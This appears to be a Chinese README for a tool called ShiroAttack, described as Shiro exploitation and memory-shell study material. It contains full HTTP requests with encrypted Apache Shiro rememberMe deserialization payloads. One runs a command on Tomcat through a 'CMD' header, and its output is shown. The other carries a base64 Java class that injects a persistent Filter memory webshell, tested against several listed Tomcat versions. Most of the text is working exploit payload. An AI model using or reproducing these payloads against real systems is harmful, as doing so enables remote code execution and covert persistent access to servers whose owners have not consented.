# ShiroAttack

> Shiro利用与内存马安全学习

## TomcatEcho

Tomcat通用回显，如下版本的Tomcat已经过测试。

- 成功: 7.0.0 7.0.10、7.0.109、8.5.54、9.0.10、9.0.70

```http
GET /login.jsp HTTP/1.1
Host: 192.168.1.223:8089
Cookie: rememberMe=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
CMD: pwd


```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Date: Tue, 04 Jun 2023 03:24:52 GMT
Content-Length: 43

/opt/apache-tomcat/apache-tomcat-7.0.0/bin

```

## FilterMemShell

Filter型内存马注入，如下版本的Tomcat已经过测试。

- 成功: 7.0.10、7.0.109、8.5.54、9.0.10、9.0.70

- 失败: 7.0.0、10.0.0

```http
POST / HTTP/1.1
Host: 192.168.1.223:8089
Content-Type: application/x-www-form-urlencoded
Content-Length: 11430
Cookie: rememberMe=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

class=yv66vgAAADQBmQEAHm9yZy9zaGlyb2F0dGFjay9GaWx0ZXJNZW1TaGVsbAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgcABQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAgTG9yZy9zaGlyb2F0dGFjay9GaWx0ZXJNZW1TaGVsbDsMAAcACAoABAAOAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwwAEAARCQACABIBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsMABQAFQkAAgAWAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAGgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAAZvdXRwdXQBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyBwAiAQANU3RhY2tNYXBUYWJsZQEACmdldFJlcVJlc3ABABUoTGphdmEvbGFuZy9PYmplY3Q7KVYMACUAJgoAAgAnCgAjAA4BAAl0ZXh0L2h0bWwIACoBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQcALAEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAuAC8LAC0AMAEABVVURi04CAAyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAcANAEAFHNldENoYXJhY3RlckVuY29kaW5nDAA2AC8LADUANwsALQA3AQAJYWRkRmlsdGVyAQAUKClMamF2YS9sYW5nL1N0cmluZzsMADoAOwoAAgA8AQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsMAD4APwoAIwBAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHAEIKAEMADgEABmVycm9yOggARQEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwAPgBHCgBDAEgBAAh0b1N0cmluZwwASgA7CgAbAEsKAEMASwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7DABOAE8LAC0AUAoAIwBLAQATamF2YS9pby9QcmludFdyaXRlcgcAUwEABXByaW50DABVAC8KAFQAVgEABWZsdXNoDABYAAgKAFQAWQEABWNsb3NlDABbAAgKAFQAXAEADmZpbHRlckRlZkNsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAlmaWx0ZXJEZWYBAA5maWx0ZXJNYXBDbGFzcwEACWZpbHRlck1hcAEAC2NvbnN0cnVjdG9yAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEADGZpbHRlckNvbmZpZwEAMkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWc7AQAMY29udGV4dEZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEmFwcGxpY2F0aW9uQ29udGV4dAEALUxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0OwEAEmZpbHRlckNvbmZpZ3NmaWVsZAEAA21hcAEAD0xqYXZhL3V0aWwvTWFwOwEADnNlcnZsZXRDb250ZXh0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAGZmlsdGVyAQAWTGphdmF4L3NlcnZsZXQvRmlsdGVyOwEACmZpbHRlck5hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBAA9zdGFuZGFyZENvbnRleHQBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dDsBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0BwB2AQAQamF2YS9sYW5nL1N0cmluZwcAeAEAKG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQHAHoBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAfAEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkNvbnRleHQHAH4BAA1qYXZhL3V0aWwvTWFwBwCAAQAPamF2YS9sYW5nL0NsYXNzBwCCAQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IHAIQBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWcHAIYBABFnZXRTZXJ2bGV0Q29udGV4dAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7DACIAIkLADUAigEABkYhbHRlcggAjAEAEGphdmEvbGFuZy9TeXN0ZW0HAI4BAAhuYW5vVGltZQEAAygpSgwAkACRCgCPAJIFAAAAAAX14QABABwoSilMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7DAA%2BAJYKAEMAlwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAmQCaCgAEAJsBAAdjb250ZXh0CACdAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAnwCgCgCDAKEBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAowCkCgB9AKUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwApwCoCgB9AKkBAA1maWx0ZXJDb25maWdzCACrCwCBAKkBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlckRlZggArgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DACwALEKAIMAsgEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlckRlZggAtAEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsMALYAtwoAgwC4AQANc2V0RmlsdGVyTmFtZQgAugEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAvAC9CgCDAL4BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAMABAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAMIAwwoAwQDEAQAOc2V0RmlsdGVyQ2xhc3MIAMYBAAdnZXROYW1lDADIADsKAIMAyQEACXNldEZpbHRlcggAywEADGFkZEZpbHRlckRlZggAzQEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyTWFwCADPAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyTWFwCADRAQANc2V0RGlzcGF0Y2hlcggA0wEAHGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGUHANUBAAdSRVFVRVNUAQAeTGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGU7DADXANgJANYA2QEABG5hbWUMANsAOwoA1gDcAQAEcGF0aAwA3gBzCQACAN8BAAZsZW5ndGgBAAMoKUkMAOEA4goAeQDjAQACLyoIAOUBAA1hZGRVUkxQYXR0ZXJuCADnAQASYWRkRmlsdGVyTWFwQmVmb3JlCADpAQAbb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0BwDrAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwwA7QDuCgCDAO8KAIUApQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAtgDyCgCFAPMBAA9wcmludFN0YWNrVHJhY2UMAPUACAoAGwD2AQANZ2V0U3RhY2tUcmFjZQEAKShMamF2YS9sYW5nL1Rocm93YWJsZTspTGphdmEvbGFuZy9TdHJpbmc7DAD4APkKAAIA%2BgEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAD8AP0LAIEA%2FgEAHyBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgYWRkZWQgOikIAQABAApFeGNlcHRpb25zAQAJdGhyb3dhYmxlAQAVTGphdmEvbGFuZy9UaHJvd2FibGU7AQACc3cBABZMamF2YS9pby9TdHJpbmdXcml0ZXI7AQACcHcBABVMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwEJAQAUamF2YS9pby9TdHJpbmdXcml0ZXIHAQsKAQwADgEAEyhMamF2YS9pby9Xcml0ZXI7KVYMAAcBDgoAVAEPAQAYKExqYXZhL2lvL1ByaW50V3JpdGVyOylWDAD1AREKAQoBEgoBDABLAQAEZGF0YQEAE1tMamF2YS9sYW5nL09iamVjdDsBAAtwYWdlQ29udGV4dAEACHJlcUZpZWxkAQAIcmVxdWVzdDIBAAlyZXNwRmllbGQBAAJleAEAB2lzQXJyYXkBAAMoKVoMARwBHQoAgwEeBwEWAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQIASEBAApnZXRSZXF1ZXN